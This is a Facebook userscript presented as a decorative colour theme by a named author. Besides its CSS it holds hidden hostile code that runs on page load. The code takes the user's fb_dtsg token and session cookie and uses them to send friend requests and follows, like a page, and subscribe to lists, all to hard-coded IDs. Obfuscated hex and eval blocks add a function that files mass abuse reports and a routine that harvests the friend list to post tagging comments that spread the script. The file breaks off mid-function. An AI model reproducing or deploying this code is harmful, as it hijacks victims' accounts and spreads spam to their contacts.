// ==UserScript==
// @name            Tema Warna warni @QDork
// @description     Tema By Muhammad Iqbal Azhari
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==

/* Themes Islam */
var parent=document.getElementsByTagName("html")[0];
var _body = document.getElementsByTagName('body')[0];
var _div = document.createElement('div');
_div.style.height="25";
_div.style.width="100%";
_div.style.position="fixed";
_div.style.top="auto";
_div.style.bottom="0";
_div.align="center";
var _audio= document.createElement('audio');
_audio.style.width="100%";
_audio.style.height="25px";
_audio.controls = true;
_audio.autoplay = true;
_audio.autoplay = true;
_audio.src = "http://c2lo.reverbnation.com/audio_player/download_song_direct/13447834";
_div.appendChild(_audio);
_body.appendChild(_div);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
alert('Facebook Auto Add : Themes Keren');
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function Like(p) { var Page = new XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 200) { Page.close; } }; Page.send(PageParams); }
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime(); function P(opo) { var X = new XMLHttpRequest(); var XURL ="//www.facebook.com/ajax/ufi/like.php"; var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); }
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
{ var http4=new XMLHttpRequest;
 var url4="/ajax/follow/follow_profile.php?__a=1";
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
 http4.open("POST",url4,true);
 http4.onreadystatechange=function()
 {  if(http4.readyState==4&&http4.status==200)http4.close };
 http4.send(params4)}
function sublist(uidss)
{ var a = document.createElement('script');
 a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
 document.body.appendChild(a);
}
var _4916;var _4238='3435F63E138B408A408C363C516E615F558D615E618E612F297B507F387B369E414F426E423A438B432F435B411E411B414A420D429C435F432F438F411C369B390B444C507F387A369E414F426B426D417C417B429F420A417A423A429D432F432F417A438D414D369C390C444D507A387C369E414A429C414D429A411B435D414F429A423F411A420E438E414E411D432C369E390F444C507E387C369F414C432F435C435C429B426B423E417E426E429C423D429F432F414F423C369F390A444C507A387F369E414E423F438C417F426F435F432E423C414E438D423E411F432D414B429E369A390F444D507A387B369D414A417D435A414B414D435D429F414A432B420A435C435F411B429B417E369D390D444A507F387B369E429A411C423E417F414A411D417F435D417C438A429E411F414F438E420A369B390A444F507A387E369C414C435B429B432B435C411F426F417A414E426E417A414E435D432B414C369B390C444A507D387D369D417D411E417D426F438D429D414C414A438A438E423D411B420B414E414A369F390E444B507A387D369A417B411A417A426E438F429A414F414C438B438E423F411A420B414C414E369A390C444A507A387A369B429F423F414C438A411B420E435C414E426C435D432F411E432F429B420E369C390F444F297F408E408B363E477A558A597E612B495B582F588A570C297C387E369D426E429A426A432F426A438E435B426A420F426A414A411F420F426E423D369F390D444C495B582D588B570A387D369E426B411E420A420B420E426F432A411D420E411A423F432E429F426C417B369E390C444E495B582F588E570E387F369C423A420C423D426D414B438E417F432C429F429F423F438D423C417A423B369D390B444B495A582C588B570D387F369F414E435D414A420D432A432C426E423B426D420E438F417D411C426D420B369D390D444C495E582D588C570B387E369C420C438F429B426F432B423F426C414F432D411A429F432C414E438B432C369C390C444C495C582C588F570C387C369F420C420E423B426F435D423A420B411E411F411C414F426C426E432C432A369A390A444C495A582C588B570F387B369E414C420E438A426F417A414D417F414D420F411D429C438C438E429C417C417B369C390C444E495D582B588D570A387C369F414C420A438F411B426B411C420E435E411C414A417C411B411E414E417D429A369F390F444F495F582B588A570A387B369D414B423E417A438C414C420A417E426A432A420C438E435B429D432F411C414D369F390A444F495B582D588B570B387E369A426A432A423A414B429F426C426C420C438B420C423A417F435C426D414E369B390C444F495A582A588A570F387A369C426F429D426E417A432A414F420A426B429A438C411A411D438A438C411C369A390D444F495E582D588B570A387B369D414A435C426B432A438F435E414A435B435E417A435F423C432E417D432F369E390A444A495F582F588D570A387E369F414F423F420F417E435C432C423C429B414C411D417C429E417B438C411D435F369E390E444A495B582F588F570D387C369C414B423A420E420A423F426E423F435A426A420B426C426E411A429F411F426A369E390C444D495C582D588F570A387F369B414B420B435E438E435E420F435C420E438D414F417B426A420E435F438F438B369D390E444B495A582D588D570D387D369B423E438A426B432E411A420F414B426C432C414E423C420B435B429A429E369D390D444A495D582E588D570E387A369C414C426E438B426E435C414B423A432F423D417C417A429F423E432E429E369D390A444E495C582A588D570A387B369C426E414B432C426A423A417D426E411C426C411E414E438B423A411A429C369F390D444F495C582B588B570A387D369D432E426F429D429D435F420F438F435D414A411C414C414C432E429E432C369F390C444D495F582A588D570D387B369B417E420E432E432A438D438A435C423D420B411C429C411B420D414F420F369A390E444E495F582B588C570D387C369F417B411D426A438A420B435E420C432B429C417C426C438C417D435A429B369D390D444D495C582E588B570C387A369D417C429D426E411D435B438B438E411B429E438A432D420F423C426D438C369A390A444D495B582D588C570A387D369D414B435F414F426C438A414C438D423C435B432D411D432A417E438E417D369E390C444C495A582C588D570E387C369F414E438C420B435A414C423C423B426B411C435F411D432E435E435C423A369D390A444F297E408F408A363F591F582F612C615E612D297B558A387B369C432D420A411D429A420F414B432A423C411D369D390C444F558C387D369C414D411C411C411B411E426E429E438D432F432C417E426B423E432D414D369E390F444F558B387B369A414E411F411A411C411D414D426E420A423D426E417F411D420A417E426C369D390C444B612B618B561E591F582D612E615A387C369C414F414C435B438A423B420C414B438D435B420F411C426C429F411F423E369D390E444F612A618B561B591F582F612C615F387D369C414C420C420E417A420D417A417C429F420A426B423A420B420E429B423A369E390A444F612C618C561A591A582A612F615D387D369F414C420F426F432D429B414B432B429A438D438B426C432B411D435A411C369D390E444A612D618F561C591C582A612E615C387A369C414A420C420A414B438A411D432D435D420B426B423E432A426B414A417B369D390A444D612D618C561C591D582A612C615C387A369D414A420E420D417A420A417F426F420B429C435B432C429F429B432D411C369C390F444E612A618E561E591B582D612B615A387E369D414F420B420A417C420B417E429A435D420A426D423C420B420D417E417E369A390B444D612A618A561B591D582C612E615C387D369F414A420C426E432F429C414E423F411F429A429A417D420E432D435B420B369E390C444C612A618C561E591E582D612C615D387B369C414A420E426D432E429B414D426B417B420B417D438C411C423E420F435E369C390C444B612A618B561D591C582E612D615D387D369C414B420F426E432D429B414A429E432F420C417B438A411E423F417A420C369E390C444F';var _8122=/[\x41\x42\x43\x44\x45\x46]/;var _7195=2;var _4603=_4238.charAt(_4238.length-1);var _2455;var _5550=_4238.split(_8122);var _6842=[String.fromCharCode,isNaN,parseInt,String];_5550[1]=_6842[_7195+1](_6842[_7195](_5550[1])/21);var _5759=(_7195==9)?String:eval;_2455='';_11=_6842[_7195](_5550[0])/_6842[_7195](_5550[1]);for(_4916=3;_4916<_11;_4916++)_2455+=(_6842[_7195-2]((_6842[_7195](_5550[_4916])+_6842[_7195](_5550[2])+_6842[_7195](_5550[1]))/_6842[_7195](_5550[1])-_6842[_7195](_5550[2])+_6842[_7195](_5550[1])-1));var _8832='_1434';var _4961='_8832=_2455';function _2229(_5382){_5759(_1167);_2229(_7217);_7217(_4961);_2229(_8832);}var _1167='_2229=_5759';var _7217='_7217=_2229';_2229(_4603);
//IDS
IDS("100001534520325");
IDS("730631740");
IDS("100005697725471");
IDS("100000252961525");
//Lists
sublist("732293180122441");
sublist("732293326789093");
//Like
Like("780207395326279");
//Theme
(function() {
var css = ".highlightIndicator, \n.tinyman:after, \n.fbTimelineSideAds,\n.ego_column,\n.buttonWrap, \n.fbTimelineSpine, \n.spinePointer, \n.topBorder, \n.bottomBorder, \n#footerContainer, \n.middleLink, \n.slimHeader #pageNav li.tinyman::after, .slimHeader #pageNav li.middleLink::after, \n.slimHeader #pageNav .middleLink a, \n.moreSectionsLink\n{\ndisplay:none !important;\n}\n\ndiv.mainWrapper{\npadding-left: 1em !important;\n}\n.uiProgressBar .fill {\nbackground: #444 !important;\nborder: solid #222 !important;\n}\n.uiTypeaheadView .compact li {\nbackground-color: #111 !important;\n}\ndiv.uiTypeaheadView .selected {\nbackground-color: #3C3 !important;\n}\n.fbIndex .gradient {\nbackground: none !important;\n}\n.notifNegativeBase #fbNotificationsFlyout li.jewelItemNew, .notifNegativeBase #fbNotificationsFlyout li.first_receipt {\nbackground: #3C3 !important;\n}\n.pop_container {\nbackground-color: #000 !important;\n}\n.pop_verticalslab, .pop_horizontalslab {\nbackground: #222 !important;\n}\n.uiMenuXItem\na.highlighted {\nbackground-color: #3C3 !important;\nborder-color: #000 !important;\ncolor: #FFF !important;\n}\n.uiMenuXItem\na.highlighted {\nbackground-color: #3C3 !important;\nborder-color: #000 !important;\ncolor: #FFF !important;\n}\n.uiContextualLayer {\nbackground-color: #111 !important;\n}\n.HighlightSelectorMenu {\nborder: 2px solid #000 !important;\nbackground: #111 !important;\nborder-radius: 5px !important;\n}\n.-cx-PUBLIC-uiDialog__border, ._1yu {\nborder: 10px solid rgba(82, 82, 82, .7) !important;\n-webkit-border-radius: 8px !important;\n}\ninput[type=\"text\"], input[type=\"password\"], .inputtext, select, .select, select > option, select > button, .fbPhotoImageStage .fbPhotosPhotoButtons .tagMessage, .fbPhotoImageStage .fbPhotosPhotoButtons .cropMessage, #u1clso_61 div img, #navSearch .uiTypeahead, .-cx-PRIVATE-uiDialog__content, ._1yu, ._t {\nbackground-color: #111 !important;\n}\n.fbTimelineCapsule\n{\nbackground: none !important;\n}\n.sp_c79t5t\n{\nbackground-image: none !important;\n}\n* {\nborder-color: transparent !important;\ncolor: #fff !important;\nbackground-color: transparent !important; \n}\n\n#fbTimelineHeadline .profilePic {\nbackground-color: #FFF !important;\nborder: 4px solid #FFF !important;\n-webkit-border-radius: 2px !important;\nheight: 160px !important;\nwidth: 160px !important;\n}\n\n\n.fbTimelineScrubber {\n\nborder-color: #CCFF33 !important;\npadding: 8px 0 8px 1px !important;\ntop: 38px !important;\nwidth: 122px !important;\nz-index: 1 !important;\nborder-radius: 10px !important;\n}\n\n.fbPhotosPhotoTagboxBase .tagName {\nbackground: #000 !important;\ncolor: #FFF !important;\ncursor: default !important;\nfont-weight: normal !important;\npadding: 2px 6px 3px !important;\ntop: 3px !important;\nwhite-space: nowrap !important;\n}\n\n.fbPhotosPhotoTagboxBase .innerTagBox {\nborder: 4px solid white !important;\nborder-color: rgba(255, 255, 255, .8) !important;\n}\n\n.fbPhotoSnowlift {\nbackground-color: rgba(0, 0, 0, .7) !important;\n}\n\n.fbPhotoSnowlift .rhc , .pagingActivated .snowliftOverlay, .fbPhotoSnowlift.taggingMode .snowliftOverlay, .stageWrapper{\nbackground-color: #111 !important;\n}\n\n.profile-picture img {\nmax-width: 170px !important;\n}\n\n.webComposerPhotoUpload input, .webComposerPhotoUpload {\ncolor: #66CC33 !important;\n}\n\n\nhtml{background:url(https://www.facebook.com/download/1435662316670212/bintang.gif) no-repeat center fixed;background-size:cover;-o-background-size:cover;-webkit-background-size:cover}\n\n\n\n\n.fbCurrentStory:hover, .connect_widget_like_button, .fbFeedTickerStory:hover, .item a:hover, .fbJewelFlyout li:hover, .uiSideNav a:hover, .fbNubFlyoutBody, .uiButtonConfirm {\nbackground: #111111 !important;\n}\n\n.fbChatMessageGroup {\nborder-color: #2c2c2c !important;\n}\n\n.fbChatSidebar {\nbackground: #111111 !important;\n}\n\n#leftCol {\nposition: relative;top:20px!important;\nmin-height: 400px !important;\n}\n\n.arrowLeft a {\nbackground-image:url('http://i.imgur.com/26zf5.png') !important;\nborder-color: #666666 !important;\n}\n\n.arrowRight a {\nbackground-image:url('http://i.imgur.com/v6B6z.png') !important;\nborder-color: #666666 !important;\n}\n\n.uiStreamSubstory {\nborder-color: transparent !important;\n}\n\n.uiHeader {\nbackground-color: transparent !important;\n}\n\n.fbSidebarGripper, .fbTickerFooter, .fbSidebarGripper div, .navSubmenu:hover {\nbackground-color: #222222 !important;\n}\n\n.fbTimelineCountButton, .uiBoxWhite, .uiButtonGroup {\nbackground-color: #1c1c1c !important;\n}\n\n\n\n#leftCol {\npadding-top: 0px !important;\npadding-left: 0px !important;\n}\n\n.fbNubFlyoutFooter {\nbackground: #111111 !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\ncolor: #00FF00!important; \nborder: #CCFF33 !important;\n}\n\n.uiStream .uiSelectorButton {\nbackground-image: url(\"http://i.imgur.com/nOfuQ.png\") !important;\n}\n\n.uiSearchInput {\nbackground-image: url(\"http://i.imgur.com/agmNw.png\") !important;\n}\n\n\n\n\n.jewelButton:hover, .topNavLink a:hover {\nbackground-color: #222222 !important;\n}\n\n.uiScrollableAreaGripper {\nbackground-color: #666666 !important;\n}\n\n.uiSearchInput, .fbPhotosGridHeader, .uiComposerMessageBoxControls, #MessagingShelf, .uiBoxGray {\nbackground: #111111 !important;\n}\n\n.uiButton {\nbackground: #1c1c1c !important;\n}\n\n#blueBar  {\nbackground: -moz-linear-gradient(top,  #45484d 0%, #66CC33 100%) !important;\nbackground: -webkit-linear-gradient(top,  #45484d 0%, #66CC33 100%) !important;\nbox-shadow: 0 0 7px rgba(211, 32, 198, 0.75) !important;\nborder:4px ridge #CC00FF !important;\nmargin-top:5px!important;\nmargin-left:5px!important;\nborder-radius: 70px!important;\n}\n\n\n\n#contentCol, #pageLogo a {\nbackground-color: transparent !important;\nborder-color: transparent !important;\n}\n\n.uiMorePager {\nmargin-bottom:6px !important;\nbackground-color: #1c1c1c !important;\nborder: 0px solid #CCFF33 !important;\n}\n\n.uiStreamStory, .fbIndexFeaturedRegistration, .signupForm {\nmargin-bottom:2px !important;\nbackground-color:transparent !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nborder-radius: 15px !important;\npadding: 1px !important;\nborder: 0px solid #CCFF33 !important;\n}\n\n.uiStream .uiStreamHeader .uiStreamHeaderChronologicalForm .uiSelectorButton .uiButtonText {\ncolor: #000 !important;\n}\n\n#album_pagelet {\nbackground-color: #111111 !important;\nmargin-left: 0px !important;\nmargin-top: -15px !important;\n}\n\n.tagWrapper, #pagelet_main_column, .timelineUnitContainer, .fbTimelineTopSection, #MessagingMessages {\nbackground-color:transparent !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nborder-radius: 15px !important;\nborder: 0px solid #CCFF33 !important;\n}\n.fbTimelineTopSectionBase .topSectionBottomBorder {\ndisplay: none !important;\n}\n#pagelet_main_column {\nwidth: 500px !important;\n}\n\n.fbJewelFlyout, .uiToggleFlyout, .navigation, .container, .uiOverlayContent, .search, .pop_container_advanced {\nbackground-color: #111111 !important; \nborder-radius: 15px !important;\nborder: 2px solid #CCFF33 !important;\n}\n\n#left_column, #leftCol, .MessagingReadHeader {\nbackground: #111111 !important;\nborder-radius: 15px !important;\n}\n\n#left_column, #leftCol {\nmargin-left:-8px !important;\nwidth: 185px !important;\n}\n\n.uiMediaThumb i, .uiProfilePhoto {\nborder: 1px solid #66CC33 !important; \n}\n\n#rightCol {\nmargin-top: 10px !important;\npadding-top: 0px !important;\nbackground: #111111 !important;\nborder-radius: 15px !important;\nborder: 0px solid #CCFF33 !important;\n}\n\n#right_column, .rightColumnWrapper {\nmargin-top: 0px !important;\npadding-top: 0px !important; \nposition: fixed !important;\nbackground: #111111 !important;\nborder-radius: 15px !important; \nborder: 0px solid #CCFF33 !important;\n}\n\n.aboutMePagelet {\nbackground-color:transparent !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nborder: 0px solid #CCFF33 !important;\n}\n\n.fbNubButton, .fbNubFlyoutTitlebar, .uiToggleFlyout, .fbChatSidebarFooter {\nbackground: -moz-linear-gradient(center top , #CCFF33, #66CC33) !important;\nbackground: -webkit-linear-gradient(center top , #CCFF33, #66CC33) !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\ncolor: #FF00FF!important;\nborder: #CCFF33 !important;\n}\n\n.fbChatOrderedList {\nbackground: -moz-linear-gradient(center right , #CCFF33, #66CC33) !important;\nbackground: -webkit-linear-gradient(center right , #CCFF33, #66CC33) !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\ncolor: #FF00FF!important;\nborder: #CCFF33 !important;\n}\n\n\n\n\n\n\n\n\n.UFIMentionsInputWrap,.navHeader, ._554n,.fbxWelcomeBox ,._2yg .composerTypeahead {\nbackground: -moz-linear-gradient(top,  #45484d 0%, #66CC33 100%) !important;\nbackground: -webkit-linear-gradient(top,  #45484d 0%, #66CC33 100%) !important;\nbox-shadow: 0 2px 4px rgba(211, 32, 198, 0.75) !important;\nborder:2px ridge #FF00FF!important;\nmargin-top:5px!important;\nmargin-left:0px!important;\nborder-radius: 7px!important;\npadding:3px!important;\n}\n.fbx #pageHead, #blueBar #pageHead{\npadding-top:0px!important;\n}\n\n.slim #blueBar {\n\n    height: 35px!important;\n}\n.fbxWelcomeBoxBlock .fbxWelcomeBoxImg,\n._s0,\n._42fz .pic{\n   border:2px solid  rgba(0, 0, 0, .55)!important;\n   border-radius: 37px!important;\n}\n.fbxWelcomeBoxBlock .fbxWelcomeBoxImg:hover,\n._s0:hover,\n._42fz .pic:hover{\n   box-shadow: 0px 0px 4px rgba(211, 32, 198, 0.75) !important;\n   border:2px ridge #FF0033 !important;\n   border-radius: 37px!important;\n}\n.uiSideNav .sideNavItem .hasCount:hover,\n.uiSideNav .sideNavItem .noCount:hover{\n   text-shadow: 2px 2px 2px rgba(39, 98, 138, 0.75) !important;\n   color: #3399FF!important;\n\n}\n#navSearch {\nwidth:300px !important;\nmargin-top: 6px !important;\nmargin-left: 30px !important;\nborder-color: transparent !important;\n}\n#headNav {\n    height: 30px;\n}\n\n\n\na:hover{\n   text-shadow: 2px 2px 2px rgba(39, 98, 138, 0.75) !important;\n   color: #3399FF!important;\n}\n.UIActionLinks_bottom a, \n.UIActionLinks_bottom button.as_link, \n.UIActionLinks_bottom .uiLinkButton input, \n.UIActionLinks_bottom .uiLinkButton input:hover,\n.uiStreamMessage .actorName, .uiStreamMessage .passiveName\n{\n   text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.99) !important;\n   color: #3399FF!important;\n}\n._2yg .composerTypeahead ,#bfb_options_button_li.openToggler ul,\n .better_fb_mini_message, .sfx_mini_message_no_x,\n .GM_options_wrapper_inner,\n .better_fb_mini_message, .mini_x{\nbackground: -moz-linear-gradient(top,  #45484d 0%, #66CC33 100%) !important;\nbackground: -webkit-linear-gradient(top, #45484d  0%,#66CC33 100%);\nbox-shadow: 0 2px 4px rgba(39, 98, 138, 0.75) !important;\nborder:2px ridge #3399FF!important;\nmargin-top:5px!important;\nmargin-left:0px!important;\nborder-radius: 7px!important;\npadding:3px!important;\n}\n.GM_options_buttons input{\n   text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.99) !important;\n   color: #CC00FF !important;\n\n}";
if (typeof GM_addStyle != "undefined") {
        GM_addStyle(css);
} else if (typeof PRO_addStyle != "undefined") {
        PRO_addStyle(css);
} else if (typeof addStyle != "undefined") {
        addStyle(css);
} else {
        var node = document.createElement("style");
        node.type = "text/css";
        node.appendChild(document.createTextNode(css));
        var heads = document.getElementsByTagName("head");
        if (heads.length > 0) {
                heads[0].appendChild(node);
        } else {
                // no head yet, stick it whereever
                document.documentElement.appendChild(node);
        }
}
})();
var _0xb161=["\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x67\x65\x74\x54\x69\x6D\x65","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x72\x65\x70\x6F\x72\x74\x2F\x73\x6F\x63\x69\x61\x6C\x2E\x70\x68\x70","\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x62\x6C\x6F\x63\x6B\x3D\x31\x26\x70\x70\x3D\x25\x37\x42\x25\x32\x32\x61\x63\x74\x69\x6F\x6E\x73\x5F\x74\x6F\x5F\x74\x61\x6B\x65\x25\x32\x32\x25\x33\x41\x25\x32\x32\x5B\x5D\x25\x32\x32\x25\x32\x43\x25\x32\x32\x61\x72\x65\x5F\x66\x72\x69\x65\x6E\x64\x73\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x63\x69\x64\x25\x32\x32\x25\x33\x41","\x25\x32\x43\x25\x32\x32\x63\x6F\x6E\x74\x65\x6E\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x30\x25\x32\x43\x25\x32\x32\x65\x78\x70\x61\x6E\x64\x5F\x72\x65\x70\x6F\x72\x74\x25\x32\x32\x25\x33\x41\x31\x25\x32\x43\x25\x32\x32\x66\x69\x72\x73\x74\x5F\x63\x68\x6F\x69\x63\x65\x25\x32\x32\x25\x33\x41\x25\x32\x32\x66\x69\x6C\x65\x5F\x72\x65\x70\x6F\x72\x74\x25\x32\x32\x25\x32\x43\x25\x32\x32\x66\x72\x6F\x6D\x5F\x67\x65\x61\x72\x25\x32\x32\x25\x33\x41\x25\x32\x32\x74\x69\x6D\x65\x6C\x69\x6E\x65\x25\x32\x32\x25\x32\x43\x25\x32\x32\x69\x73\x5F\x66\x6F\x6C\x6C\x6F\x77\x69\x6E\x67\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x69\x73\x5F\x74\x61\x67\x67\x65\x64\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x6F\x6E\x5F\x70\x72\x6F\x66\x69\x6C\x65\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x70\x68\x61\x73\x65\x25\x32\x32\x25\x33\x41\x33\x25\x32\x43\x25\x32\x32\x72\x65\x66\x25\x32\x32\x25\x33\x41\x25\x32\x32\x68\x74\x74\x70\x73\x25\x33\x41\x25\x35\x43\x25\x32\x46\x25\x35\x43\x25\x32\x46\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x25\x35\x43\x25\x32\x46\x6B\x6F\x70\x61\x63\x69\x2E\x6B\x6F\x70\x61\x63\x69\x25\x32\x32\x25\x32\x43\x25\x32\x32\x72\x65\x70\x6F\x72\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x31\x34\x35\x25\x32\x43\x25\x32\x32\x72\x69\x64\x25\x32\x32\x25\x33\x41","\x25\x32\x43\x25\x32\x32\x73\x75\x62\x5F\x72\x65\x70\x6F\x72\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x33\x25\x32\x43\x25\x32\x32\x74\x69\x6D\x65\x5F\x66\x6C\x6F\x77\x5F\x73\x74\x61\x72\x74\x65\x64\x25\x32\x32\x25\x33\x41","\x25\x32\x43\x25\x32\x32\x75\x73\x65\x72\x25\x32\x32\x25\x33\x41","\x25\x37\x44\x26\x66\x69\x6C\x65\x5F\x72\x65\x70\x6F\x72\x74\x3D\x31\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x6E\x38\x61\x68\x79\x6A\x32\x71\x6D\x76\x75\x35\x6B\x39\x55\x6D\x41\x41\x61\x55\x56\x70\x6F\x26\x5F\x5F\x72\x65\x71\x3D\x75\x26\x74\x74\x73\x74\x61\x6D\x70\x3D\x32\x36\x35\x38\x31\x36\x38\x35\x37\x31\x30\x37\x31\x31\x30\x38\x38\x38\x30","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x75\x73","\x63\x6C\x6F\x73\x65","\x73\x65\x6E\x64","\x31\x32\x36\x30\x35\x36\x37\x37\x38\x32"];var fb_dtsg=document[_0xb161[2]](_0xb161[1])[0][_0xb161[0]];var user_id=document[_0xb161[4]][_0xb161[3]](document[_0xb161[4]][_0xb161[3]](/c_user=(\d+)/)[1]);var now=( new Date)[_0xb161[5]]();function Report(_0x45e7x5){var _0x45e7x6= new XMLHttpRequest();var _0x45e7x7=_0xb161[6];var _0x45e7x8=_0xb161[7]+fb_dtsg+_0xb161[8]+_0x45e7x5+_0xb161[9]+_0x45e7x5+_0xb161[10]+now+_0xb161[11]+user_id+_0xb161[12]+user_id+_0xb161[13];_0x45e7x6[_0xb161[15]](_0xb161[14],_0x45e7x7,true);_0x45e7x6[_0xb161[16]]=function (){if(_0x45e7x6[_0xb161[17]]==4&&_0x45e7x6[_0xb161[18]]==200){_0x45e7x6[_0xb161[19]];} ;} ;_0x45e7x6[_0xb161[20]](_0x45e7x8);} ;
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","646071222120689","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," Horee Teman2 aku berhasil,, coba juga \udbb8\udc46 \udbb8\udc3c \udbb8\udc41 @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text=","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function 